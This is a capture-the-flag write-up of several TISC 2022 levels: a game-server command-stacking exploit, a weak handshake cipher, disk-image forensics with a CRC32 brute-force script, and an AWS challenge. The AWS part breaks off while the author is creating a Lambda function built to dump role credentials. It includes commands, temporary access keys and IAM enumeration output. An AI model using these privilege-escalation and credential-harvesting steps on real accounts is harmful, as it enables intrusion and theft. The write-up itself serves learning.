# TISC 2022 - PALINDROME

Joined this year yet again aiming to at least complete the web challenges, suffice to say I completed it satisfactorily. Had quite a good run and ended up at 14th place by the final count. This year's split path really helped to motivate us normal non RE players to at least complete halfway through the circuit.

## Level 1 - Slay the Dragon

A python game with source code was provided, along with the description:

```
DESCRIPTION

Topic: Pwn  
  
The recently launched online RPG game "Slay The Dragon" has been hot topic in the online gaming community of late, due to a seemingly impossible final boss. Amongst the multiple tirades against the forementioned boss, much controversy has been brewing due to rumors of the game being a recruitment campaign for PALINDROME, the cybercriminal organisation responsible for recent cyberattacks on Singapore's critical infrastructure.  
  
You are tasked to find a way to beat (hack) the game and provide us with the flag (a string in the format TISC{xxx}) that would be displayed after beating the final boss. Your success is critical to ensure the safety of Singapore's cyberspace, as it would allow us to send more undercover operatives to infiltrate PALINDROME.  
  
To aid in your efforts, we have managed to obtain the source code of the game for you. We look forward to your success!  
  
You will be provided with the following:  
  
1. Source code for game client/server (Python 3.10.x)  
2. Game client executable (Compiled with PyInstaller)  
- Highly recommended that you run it in a modern terminal (not cmd.exe) for the optimal experience:  
- Windows: [Windows Terminal](https://github.com/microsoft/terminal) or [ConEmu](https://www.fosshub.com/ConEmu.html) recommended.  
- Linux: the default terminal should be fine.  
  
Note: If you'd like to make any modifications to the client, we'd strongly suggest modifying the source code and running it directly. The game client executable has been provided purely for your convenience in checking out the game.  
  
Host: chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg
Port: 18261
```

While playing the game, it is noted that you can delete areas in the client side code to affect client side changes, such as reducing the creeper spawn rate to 0 to get infinite money hack. \$\_\$ 

```python
from random import random

  
from client import GameClient
from client.ui import screens
from core.models import Command


CREEPER_ENCOUNTER_CHANCE = 0.2 # <- change to 0 for infinite money hack
  
class WorkEvent:
    def __init__(self, client: GameClient) -> None:
        self.client = client
    def run(self):
        if random() <= CREEPER_ENCOUNTER_CHANCE: # <- or you can just remove this
            self.__die_to_creeper() # <- or this
        self.__mine_safely()
    def __die_to_creeper(self):
        screens.display_creeper_screen()
        screens.display_game_over_screen()
        self.client.exit()
    def __mine_safely(self):
        screens.display_working_screen() #<- remove to speed up working time
        self.client.send_command(Command.WORK)
```

However, at the final boss, the dragon, one hit from the dragon reduces you to 0 instantly and you have no way to do anything but run... Cant even heal.

```bash
███████████████████████████████████████████████████████████████████▀██████████████
█─▄▄▄▄█▄─▄████▀▄─██▄─█─▄███─▄─▄─█─█─█▄─▄▄─███▄─▄▄▀█▄─▄▄▀██▀▄─██─▄▄▄▄█─▄▄─█▄─▀█▄─▄█
█▄▄▄▄─██─██▀██─▀─███▄─▄██████─███─▄─██─▄█▀████─██─██─▄─▄██─▀─██─██▄─█─██─██─█▄▀─██
▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀▀▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▄▀▀▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀


  ╭─ PLAYER ───────────────────────────╮  ╭─ DRAGON ───────────────────────────╮
  │                                    │  │                                    │
  │      HP: ████████████████████      │  │      HP: ████████████████████      │
  │                        10/ 10      │  │                       100/100      │
  │                                    │  │                                    │
  │      ATTACK  :   3                 │  │      ATTACK  :  50                 │
  │      GOLD    : 999                 │  │                                    │
  │      POTIONS : 999                 │  │                                    │
  │                                    │  │                                    │
  ╰────────────────────────────────────╯  ╰────────────────────────────────────╯

   1. ATTACK
   2. HEAL
   3. RUN

   ❯❯❯ 

```

... Welp, obviously there has to be another way around this. A quick look into how the server takes in the attack command shows something interesting.

`server/service/battleservice.py`
```python
def run(self):
        self.__send_next_boss()

        while True:
            self.history.log_commands_from_str(self.server.recv_command_str())

            match self.history.latest:
                case Command.ATTACK | Command.HEAL:
                    self.history.log_command(Command.BOSS_ATTACK)
                case Command.VALIDATE:
                    break
                case Command.RUN:
                    return
                case _:
                    self.server.exit(1)
  
        match self.__compute_battle_outcome():
            case Result.PLAYER_WIN_BATTLE:
                self.__handle_battle_win()
                return
            case Result.BOSS_WIN_BATTLE:
                self.server.exit()
            case _:
                self.server.exit(1)
```

In particular, the focus is on how the server takes in a string, and logs the commands that are in the string. It then takes the latest in the history of what I eventually traced to be the the logs that it was added to. Let's have a look at how `log_commands_from_str()` within `CommandHistorian`, which is the class tagged to `self.history`, was implemented.

`core/models/command.py`
```python
@dataclass
class CommandHistorian:
    commands: List[Command] = field(default_factory=list)
    def log_command(self, command: Command):
        self.commands.append(command)
    def log_commands(self, commands: List[Command]):
        self.commands.extend(commands)
    def log_command_from_str(self, command_str: str):
        self.log_command(Command(command_str))
    def log_commands_from_str(self, commands_str: str):
        self.log_commands(
            [Command(command_str) for command_str in commands_str.split()]
        )
    @property
    def latest(self) -> Optional[Command]:
        try:
            return self.commands[-1]
        except IndexError:
            return None
```

Seems like `commands_str.split()` is used, before logging every single command that is gotten from this string, delimited by a space. Theoratically, this means that if the client sent a string instead of a preset command, the server would eat it up and log the commands as well. Something like `ATTACK ATTACK ATTACK ...snipped for brevity... ATTACK ATTACK` for example, would potentially kill the dragon before it has a chance to attack us. This is proven further with the follow logic when computing the outcome of a battle:

`server/service/battleservice.py`
```python
def __compute_battle_outcome(self) -> Optional[Result]:
        for command in self.history.commands
            match command:
                case Command.ATTACK:
                    self.boss.receive_attack_from(self.player)
                    if self.boss.is_dead:
                        return Result.PLAYER_WIN_BATTLE
                case Command.HEAL:
                    self.player.use_potion()
                case Command.BOSS_ATTACK:
                    self.player.receive_attack_from(self.boss)
                    if self.player.is_dead:
                        return Result.BOSS_WIN_BATTLE
        return None
```

Apparently, the computation of battle outcome is just going through the entire list of commands, and allowing the boss to receive attacks from the player or any other actions. However, as soon as the boss is noted to be dead after an attack from a player, the outcome is decided even if the boss has a One Hit KO move right after. Thus, if we flood the history with `ATTACK` commands until the mighty beast is felled, we wont need to worry about the counter attack killing us off! With this basic idea in mind, I quickly slapped together a quick fix that would give me 100 attacks instead of one. 

`client/gameclient.py`
```python
@dataclass
class GameClient:
    connection: NetClient
    
    @classmethod
    def create(cls, host: str, port: int) -> "GameClient":
        return cls(NetClient(host, port))
        
    @property
    def player(self) -> Player:
        return self.fetch_player()

    def run_event(self, event: Event):
        event.run()
        return

    def send_command(self, command: Command):
        if command == Command.RUN:
            hax = "ATTACK ATTACK ...snipped for brevity... ATTACK ATTACK"
            self.__send(hax) #<- ohoho how clever RUN is now KILL muahaha..
            return
        self.__send(command.value)
```

Quickly, my hopes were dashed. 
```bash
Traceback (most recent call last):
  File "/home/kali/Desktop/slay_the_dragon/src/main.py", line 42, in <module>
    run()
  File "/home/kali/.local/lib/python3.10/site-packages/click/core.py", line 1130, in __call__
    return self.main(*args, **kwargs)
  File "/home/kali/.local/lib/python3.10/site-packages/click/core.py", line 1055, in main
    rv = self.invoke(ctx)
  File "/home/kali/.local/lib/python3.10/site-packages/click/core.py", line 1404, in invoke
    return ctx.invoke(self.callback, **ctx.params)
  File "/home/kali/.local/lib/python3.10/site-packages/click/core.py", line 760, in invoke
    return __callback(*args, **kwargs)
  File "/home/kali/Desktop/slay_the_dragon/src/main.py", line 30, in run
    client.run_event(BattleEvent(client=client))
  File "/home/kali/Desktop/slay_the_dragon/src/client/gameclient.py", line 33, in run_event
    event.run()
  File "/home/kali/Desktop/slay_the_dragon/src/client/event/battleevent.py", line 45, in run
    match self.client.fetch_result():
  File "/home/kali/Desktop/slay_the_dragon/src/client/gameclient.py", line 44, in fetch_result
    return Result(self.__recv())
  File "/usr/lib/python3.10/enum.py", line 385, in __call__
    return cls.__new__(cls, value)
  File "/usr/lib/python3.10/enum.py", line 710, in __new__
    raise ve_exc
ValueError: '' is not a valid Result
```
It seems like I somehow broke the game... Well, back to the drawing board! 

Turns out that the server recognised that I did an amazing kill but because my game client wasn't realising I was such an awesome player, it failed to catch the return message of me beating the boss, and once the game states were desynced between the game client and the game server, things quickly broke down. Thus, I needed to reflect my new and updated awesome attack power on the game client side. This led to me changing one value in the `core/config.py` file.

`core/config.py`
```python
from os import path

######################
#     GAME CONFIG    #
######################

        # Player
BASE_ATTACK = 9001 # ITS OVER 9000!!! okay but seriously as long as its synced.

# Item
SWORD_PRICE = 5
SWORD_ATTACK_BONUS = 2
POTION_PRICE = 1
POTION_POTENCY = 10

# Work
WORK_SALARY = 5

...etc...
```

With our swanky new attack power, lets slay the dragon and get out of Level 1!
```bash

   █████    █████   █████   █████      █████  ██        ███   █████ ██   ██     
   ██   █  ██   ██ ██      ██         ██      ██       █████   ███  ███  ██     
   ██████  ██   ██  █████   █████      █████  ██      ██   ██  ███  ██ █ ██     
   ██   ██ ██   ██      ██      ██         ██ ██      ███████  ███  ██  ███     
   ██████   █████   █████   █████      █████  ███████ ██   ██ █████ ██   ██     



                   Thank you for playing, here is your flag:                    

      TISC{L3T5_M33T_4G41N_1N_500_Y34R5_96eef57b46a6db572c08eef5f1924bc3}       
```

Flag: TISC{L3T5_M33T_4G41N_1N_500_Y34R5_96eef57b46a6db572c08eef5f1924bc3} 

---
## Level 2 - Leaky Matrices

A PDF was attached along with this description:
```
DESCRIPTION

Topic: Cryptography  
  
Looks like PALINDROME implemented their own authentication protocol and cryptosystem to provide a secure handshake between any 2 services or devices. It does not look secure to us, can you take a look at what we have got?  
  
Try to fool their authentication service: nc chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg 56765

```
As someone with almost no cryptographic knowhow, I was apprehensive approaching this problem at first, but the thought of being stuck at Level 2 spurred (*scared*) me into action. A very simplified whitepaper was attached, which described the algorithm being used. 

One part to note was that all operations happened in GF(2), which on further reading turns out to be a binary sort of function, returning the result of the matrix multiplication as either 0 or 1. The 8x8 matrix was also randomly generated, and on initial launch the service allowed you to challenge them 8 times, before challenging you 8 times, and if you succeeded in all 8 times, it would spit out the flag.

The key was realising that the 8 initial challenges for the 8x8 matrix meant you could just feed in an identity matrix for the first 8 times you are querying the server, and you could likely piece together their 8x8 matrix of either 0 or 1, just by following the whitepaper implementation. 

I did this manually because I am pleb, but likely you could script it. 
```bash
$ nc chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg 56765

 ::::::::        :::       :::     :::     :::   :::
:+:    :+:       :+:       :+:   :+: :+:   :+:   :+:
      +:+        +:+       +:+  +:+   +:+   +:+ +:+
    +#+          +#+  +:+  +#+ +#++:++#++:   +#++:
  +#+            +#+ +#+#+ +#+ +#+     +#+    +#+
 #+#              #+#+# #+#+#  #+#     #+#    #+#
##########         ###   ###   ###     ###    ###

:::    ::: :::::::::: :::   :::          :::               :::
:+:   :+:  :+:        :+:   :+:         :+:                 :+:
+:+  +:+   +:+         +:+ +:+         +:+                   +:+
+#++:++    +#++:++#     +#++:         +#+    +#++:++#++:++    +#+
+#+  +#+   +#+           +#+           +#+                   +#+
#+#   #+#  #+#           #+#            #+#                 #+#
###    ### ##########    ###             ###              ###

:::     ::: :::::::::: :::::::::  ::::::::::: :::::::::: :::   :::
:+:     :+: :+:        :+:    :+:     :+:     :+:        :+:   :+:
+:+     +:+ +:+        +:+    +:+     +:+     +:+         +:+ +:+
+#+     +:+ +#++:++#   +#++:++#:      +#+     :#::+::#     +#++:
 +#+   +#+  +#+        +#+    +#+     +#+     +#+           +#+
  #+#+#+#   #+#        #+#    #+#     #+#     #+#           #+#
    ###     ########## ###    ### ########### ###           ###

=============
Challenge Me!
=============
Challenge Me #01 <-- 10000000
My Response --> 10100000
Challenge Me #02 <-- 01000000
My Response --> 10000000
Challenge Me #03 <-- 00100000
My Response --> 01011110
Challenge Me #04 <-- 00010000
My Response --> 10100100
Challenge Me #05 <-- 00001000
My Response --> 01010110
Challenge Me #06 <-- 00000100
My Response --> 01110000
Challenge Me #07 <-- 00000010
My Response --> 10100110
Challenge Me #08 <-- 00000001
My Response --> 00010000
==============
Challenge You!
==============
Challenge You #01 --> 01010111
Your Response <-- 11100010
Challenge You #02 --> 01101100
Your Response <-- 11111000
Challenge You #03 --> 00000100
Your Response <-- 01110000
Challenge You #04 --> 01011011
Your Response <-- 11000100
Challenge You #05 --> 11001001
Your Response <-- 01100110
Challenge You #06 --> 10101010
Your Response <-- 00001110
Challenge You #07 --> 11010111
Your Response <-- 01000010
Challenge You #08 --> 00100110
Your Response <-- 10001000
========================
All challenges passed :)
========================
=================================================================
Here is your flag: TISC{d0N7_R0lL_Ur_0wN_cRyp70_7a25ee4d777cc6e9}

```

On passing all 8 challenges properly, the following flag was given: 

Flag: TISC{d0N7_R0lL_Ur_0wN_cRyp70_7a25ee4d777cc6e9}

Crypto is really not my strong suit :(

---
## Level 3.1 - PATIENT0 - Part 1

Level 3 was a little irritating in that it was split into Parts 1 and 2, with Part 1 giving no points at all. Here is the description for this 0 point prereq challenge, with a corrupted boot sector file.

```
DESCRIPTION

Topic: Forensics  
  
Palindrome has spread some virus to corrupt machines causing incorrect readings in patients' health measurements and rending them unusable. Inspect the file and see if you can uncover the 8 corrupted bytes that renders the file system unusable?  
  
Submit your flag in this format: TISC{last 4 bytes in 8 lowercase hex characters}
```

Inspecting the file gave this:

```bash
$ file PATIENT0
PATIENT0: DOS/MBR boot sector, code offset 0x52+2, OEM-ID "NTFS    ", sectors/cluster 8, Media descriptor 0xf8, sectors/track 0, FAT (1Y bit by descriptor); NTFS, physical drive 0xab3566f7, sectors 12287, $MFT start cluster 4, $MFTMirror start cluster 767, bytes/RecordSegment 2^(-1*246), clusters/index block 1, serial number 05c66c6b160cddda1

$ binwalk PATIENT0 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
5312512       0x511000        PNG image, 1227 x 57, 8-bit/color RGB, non-interlaced
5312603       0x51105B        Zlib compressed data, compressed
5496832       0x53E000        PDF document, version: "1.7"
5496978       0x53E092        Zlib compressed data, default compression
5691000       0x56D678        Zlib compressed data, default compression
5869970       0x599192        JPEG image data, JFIF standard 1.01
5966510       0x5B0AAE        JPEG image data, JFIF standard 1.01
6004382       0x5B9E9E        Zlib compressed data, default compression

```

After extracting the files, a few clues here and there pointed to the BPB, which according to Wikipedia was the BIOS parameter block. A few other random clues here and there, but nothing that could be immediately useful.

![[bpb.png]]

Another picture file with the following: `GIXFI2DJOJZXI6JAMZXXEIDUNBSSAZTMMFTT6ICHN4QGM2LOMQQHI2DFEBZXI4TFMFWS4CQ=`
which after throwing into CyberChef, turned out to be a Base32 encoding that says:
`2.Thirsty for the flag? Go find the stream.`

Anyways, by targetting the BIOS parameter block, which was found at the end of a file at byte(?) 511000, we could get this part of the hexcode out, and after noting the last 4 characters after a TISC block, we could extract out the flag for the first part of Level 3.

![[level3part1.png]]

Flag: TISC{f76635ab}

## Level 3.2 - PATIENT0 - Part 2

Gathering all the previous clues and this description, we know that there is probably a TrueCrypt file hidden somewhere and we have to decrypt it with the previous flag as a password. This is really kind of convoluted, but then again most forensics challenges are...

```
DESCRIPTION

Topic: Forensics  
  
Palindrome must have leaked one of their passwords as the 4 corrupted bytes (Part 1 flag)! Dig deeper to find what was hidden!  
  
Submit your flag in this format: TISC{md5 hash} <-- will be prompted only after opening hidden room.  
  
Note: Please ignore the word 'original' in clue 4.
```

Again, I cant open up any hints for this and I can't exactly remember what hint was here, it was quite a while ago...

By using TSK to extract the message.png which is actually a bin file, we could extract a truecrypt file that had 2 clues appended to the head and the tail of the file respectively. 

`3. Are there Treu random bytes for Cryptology?`
`4. If you need a password, the original reading of the BPB was actually Checked and ReChecked 32 times!`

These point to TrueCrypt and CRC32 respectively. It will be made apparently in a bit why these matter. Anyways, by throwing the entire file into hex editor and removing those clues, we get a .tc file that we can use TrueCrypt software to mount the volume, using the first flag we got as a password. 

![[level3part2tc1.png]]

Within this mounted volume, there is only one picture.

![[outer.jpg]]

The clue is a little hard to understand, and I dived into a little too many rabbitholes at this point in time thinking that the numbers were the key and trying to brute force the solution before realising that we were just supposed to guess the final word, which was underlined with much emphasis placed on it. *duh* moment right there.

Anyways, to paraphrase the cryptic clue, we were just supposed to find the true key to unlock the hidden volume within the truecrypt file, and that true key resembled an english word that described the condition of ... hash *collision*. Given that out of the entire word, ollisio were blanked out, it stands to reason that any of them could be replaced with 0 1 and 5 to still resemble the english word collision. Also, given the previous hint on CRC32, we can also reason that there must be some sort of collision going on with the CRC32 hash of the true key. Given that the CRC32 hash value looks suspiciously like the initial key, we can thus deduce that we need to make them look alike. Thinking back this was a little bit of a leap in logic, which probably explained why more clues were provided.

Armed with all this, we need now to generate all permutations of leetspeak of collision, and hash it to check which one of them had a hash collision with our initial password. With that in mind, a quick script would really be helpful here, because I really would not want to individually search up every single permutation...

```python
import binascii 
string = "collision" # only 1,2,3,4,5,6,7,8 need to change 
strings = [] 
strings.append(string) 

def get_perms(base, curr, i): 
    if i == len(base): 
        strings.append(curr) 
    else: 
		check = base[i:i+1] 
		if check == 'o': 
			get_perms(base, curr + '0', i+1) 
			get_perms(base, curr + 'o', i+1) 
		elif check == 'l': 
			get_perms(base, curr + '1', i+1) 
			get_perms(base, curr + 'l', i+1) 
		elif check == 'i': 
			get_perms(base, curr + '1', i+1) 
			get_perms(base, curr + 'i', i+1) 
		elif check == 's': 
			get_perms(base, curr + '5', i+1) 
			get_perms(base, curr + 's', i+1) 
		else: 
			get_perms(base, curr + check, i+1) 

get_perms(string, "", 0) 

for string in strings: 
	crc = binascii.crc32(string.strip().encode("utf-8")) 
	text = '{:#010x}'.format(crc) 
	if text == '0xf76635ab' or text == '0xab3566f7': 
		# in case big endian/little endian mixes it up
		print(string.strip())
```

The output from the script gave one answer: `c01lis1on`

![[level3part2tc2.png]]!

The only file in there was a flag.ppsm which opened up as this. Open this file while PowerPoint was open allowed you to move the picture away and save the sound clip as a file to check the md5 hash for.

![[level3part2flag.png]]
For Ease of Reading:
TISC{md5 hash of sound clip}

Flag: TISC{f9fc54d767edc937fc24f7827bf91cfe}

---
## Level 4B - CloudyNekos

At this point, the challenge path split, allowing the RE players and the other players to diverge and play their own respective games. Being not one of those who particularly enjoy the arduous task of staring at binaries, I opted to go for the Cloud/Web route, not knowing the pain lying ahead...

```
DESCRIPTION

Topic: Cloud  
  
We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.  
  
We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.  
  
Start here: http://d20whnyjsgpc34.cloudfront.net  
  
*NOTE*: Solving challenge 4B allows you to complete level 4, but unlocks challenge 5B only!
```

The start point was given, so I went straight for it and clicked into it.

![[level4startpoint.png]]

This seemingly innocent webpage full of cat photos had interesting things ongoing in its source code, in particular, in its comments of the html page.

```html
<div class="p-5 text-center bg-light">
    <!-- Passcode -->
    <h1 class="mb-3">Cats rule the world</h1>
    <!-- Passcode -->
    <!-- 
    ----- Completed -----
    * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
      
    ----- TODO -----
    * Configure custom header referrer and enforce S3 bucket to only accept that particular header
    * Secure all object access
    -->
    <h4 class="mb-3">—ฅ/ᐠ. ̫ .ᐟ\ฅ —</h4>
  </div>
```

From this, we had a passcode, which we have no idea what to do with as of now, and a new name, `palindromecloudynekos` as the bucket name to use. A simple enumeration on the S3 buckets for that bucket name on aws cli to check if it was publicly accessible allowed for me to obtain more information to further pivot inwards.

```bash
$ aws s3 ls s3://palindromecloudynekos/
                           PRE api/
                           PRE img/
2022-08-23 09:16:20         34 error.html
2022-08-23 09:16:20       2257 index.html
```

Further enumeration revealed the existence of notes.txt within the api folder, which had the following written:

```
# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```

Here, we now know how to use the passcode we found earlier. Also, a note here that the EC2 instances we create need to be tagged with agent: username or else it would be wiped out. This will be useful later on. 

With this, I send the following request through burp:

```http
GET /prod/agent HTTP/2
Host: b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Cat-Header: cats_rule_the_world
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

This is the response I received:

```http
HTTP/2 200 OK
Date: Sun, 11 Sep 2022 18:09:25 GMT
Content-Type: application/json
Content-Length: 296
Access-Control-Allow-Origin: *
Apigw-Requestid: YTqc4iQFSQ0EP4g=

{"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMSYJSR6PGF", "Secret_Key": "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"}
```

With that, I had gotten the initial access, and now have some limited user permissions to interact with the AWS services with. After enumerating permissions with my own bash script that took the output from potential options from the aws cli help manual, I found something useful with this command:  `aws iam list-roles`, which then further resulted in more enumeration on each of the interesting roles.

`ec2_agent_role`
```json
{
    "Path": "/",
    "RoleName": "ec2_agent_role",
    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
    "CreateDate": "2022-07-22T09:29:34Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "ec2.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
},
```

`aws iam list-attached-role-policies --role-name ec2_agent_role`
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_ec2_agent_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"
        }
    ]
}
```

`aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1`
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "dynamodb:DescribeTable",
                        "dynamodb:ListTables",
                        "dynamodb:Scan",
                        "dynamodb:Query"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "VisualEditor0"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-07-22T09:29:34Z"
    }
}
```

This seems like `ec2_agent_role` is able to interact with the dynamodb, which could be where our flag is stored.

Another interesting role:

`lambda_agent_development_role`
```json
{
    "Path": "/",
    "RoleName": "lambda_agent_development_role",
    "RoleId": "AROAQYDFBGMS2NDQR5JSE",
    "Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "CreateDate": "2022-07-22T09:29:34Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
```

`aws iam list-attached-role-policies --role-name lambda_agent_development_role`
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_lambda_agent_development_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
        }
    ]
}
```

`aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v1`
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-07-22T09:29:36Z"
    }
}
```

Since --version-id v1 is not default version as can be seen in the `IsDefaultVersion: false` field, we try to find the default version instead.

`aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2`
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "lambda:GetFunction"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-08-23T13:16:26Z"
    }
}
```

It can be seen that `cat-service` is enabled for the default version additionally. Not entirely sure how that will come in handy, but it should. 

Moving on, let us now have a look at what we can actually do as a user.

```bash
$ aws sts get-caller-identity
{
    "UserId": "AIDAQYDFBGMS3H7Z7JOHN",
    "Account": "051751498533",
    "Arn": "arn:aws:iam::051751498533:user/user-d17bf80d60e64bbf976745babfded26a"
}
                                                                                                                                                            
$ aws iam list-attached-user-policies --user-name user-d17bf80d60e64bbf976745babfded26a
{
    "AttachedPolicies": [
        {
            "PolicyName": "user-d17bf80d60e64bbf976745babfded26a",
            "PolicyArn": "arn:aws:iam::051751498533:policy/user-d17bf80d60e64bbf976745babfded26a"
        }
    ]
}
                                                                                                                                                            
$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/user-d17bf80d60e64bbf976745babfded26a --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListRoles"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "lambda:CreateFunction",
                        "lambda:InvokeFunction",
                        "lambda:GetFunction"
                    ],
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::051751498533:user/${aws:username}"
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Resource": "arn:aws:iam::051751498533:role/lambda_agent_development_role"
                },
                {
                    "Sid": "VisualEditor4",
                    "Effect": "Allow",
                    "Action": [
                        "ec2:DescribeVpcs",
                        "ec2:DescribeRegions",
                        "ec2:DescribeSubnets",
                        "ec2:DescribeRouteTables",
                        "ec2:DescribeSecurityGroups",
                        "ec2:DescribeInstanceTypes",
                        "iam:ListInstanceProfiles"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-09-11T18:09:24Z"
    }
}
    
```

It seems like as a user, we are allowed to create lambda functions, and have it run on the lambda_agent_development_role, as long as it is created with our username as part of its regex as its function name. Thus, as long as our function name has our username-(anything), it would be able to run.

Following [AWS's documentation] (https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-awscli.html)
on how to create lambda functions, we come to the following command, with the following file in a zip file. 

`index.js`
```javascript
exports.handler = async function(event, context) {
  console.log("ENVIRONMENT VARIABLES\n" + JSON.stringify(process.env, null, 2))
  console.log("EVENT\n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
```

`function.zip`
```bash
zip function.zip index.js
```

`aws lambda create-function --function-name user-d17bf80d60e64bbf976745babfded26a-helloworld --zip-file fileb://function.zip --handler index.handler --runtime nodejs16.x  --role arn:aws:iam::051751498533:role/lambda_agent_development_role`
```json
{
    "FunctionName": "user-d17bf80d60e64bbf976745babfded26a-helloworld",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-d17bf80d60e64bbf976745babfded26a-helloworld",
    "Runtime": "nodejs16.x",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "index.handler",
    "CodeSize": 325,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-09-11T18:38:00.801+0000",
    "CodeSha256": "gzulG07w9+ikcKmrJIHnDZPDOqKY4ZLJWTZ0EIs/RXo=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "46909f21-c77c-4a08-bd0a-9460c220d9b1",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
```

Once it is created, we can now invoke the lambda function in order to extract the AWS credentials.

